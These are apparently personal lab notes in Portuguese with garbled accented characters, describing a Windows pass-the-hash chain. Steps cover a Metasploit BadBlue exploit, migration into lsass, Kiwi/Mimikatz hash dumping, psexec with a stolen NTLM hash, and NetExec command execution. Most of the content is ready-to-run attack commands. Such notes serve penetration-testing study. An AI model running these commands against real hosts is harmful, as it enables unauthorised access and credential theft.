#+title: ğŸ”‘ Pass-the-Hash (PtH) Flow
#+author: Gabriel
#+options: num:nil toc:t

* ğŸ› ï¸ ExploraÃ§Ã£o Inicial: BadBlue
O ponto de entrada utiliza o exploit =badblue_passthru= para obter acesso inicial ao servidor Windows.

#+begin_src sh
use exploit/windows/http/badblue_passthru
set RHOSTS 10.10.62.4
exploit
#+end_src

* ğŸ•µï¸ PÃ³s-ExploraÃ§Ã£o & Escalonamento (Meterpreter)
Uma vez com a sessÃ£o do Meterpreter ativa, o objetivo Ã© migrar para um processo seguro e extrair hashes.

** ğŸ”„ MigraÃ§Ã£o de Processo
Ã‰ necessÃ¡rio migrar para o processo =lsass.exe= (Local Security Authority Subsystem Service), que gerencia as credenciais no Windows.

#+begin_src sh
# Localizar o PID do lsass
pgrep lsass

# Migrar para o PID encontrado (exemplo: 780)
migrate 780
#+end_src



** ğŸ§ª ExtraÃ§Ã£o de Credenciais (Kiwi/Mimikatz)
Com privilÃ©gios de SYSTEM apÃ³s a migraÃ§Ã£o, carregamos a extensÃ£o Kiwi (Mimikatz moderno).

#+begin_src sh
load kiwi

# Dump do SAM (Security Account Manager) via LSA
lsa_dump_sam

# Alternativa rÃ¡pida para pegar hashes NTLM
hashdump
#+end_src

* ğŸš€ Lateral Movement: Pass-the-Hash
O ataque de Pass-the-Hash consiste em usar o hash NTLM coletado diretamente para autenticar em outra mÃ¡quina (ou na mesma via outro serviÃ§o), sem conhecer a senha em texto claro.

** ğŸ“¦ ConfiguraÃ§Ã£o do PsExec
Utilizamos o mÃ³dulo =psexec= para execuÃ§Ã£o remota de cÃ³digo via SMB.

#+begin_src sh
use exploit/windows/smb/psexec
set RHOSTS 10.10.62.4
set SMBUser Administrator

# Configurar o SMBPass com o hash completo coletado (LM:NTLM)
# Exemplo: aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
set SMBPass <HASH_COMPLETO_AQUI>
#+end_src

** ğŸ› ï¸ Ajuste de Target (Troubleshooting)
Se a execuÃ§Ã£o padrÃ£o falhar, ajustamos o mÃ©todo de entrega do payload.

#+begin_src sh
# Alterar para Native Upload se o comando simples falhar
set target Native\ upload
exploit
#+end_src



* ğŸ›¡ï¸ ObservaÃ§Ã£o: NetExec (nxc)
Para automaÃ§Ã£o rÃ¡pida de comandos usando o hash, o **NetExec** (antigo CrackMapExec) Ã© a ferramenta preferida no seu **Zsh**:

#+begin_src sh
nxc smb 10.10.62.4 -u Administrator -H <NTLM_HASH> -x "whoami"
#+end_src

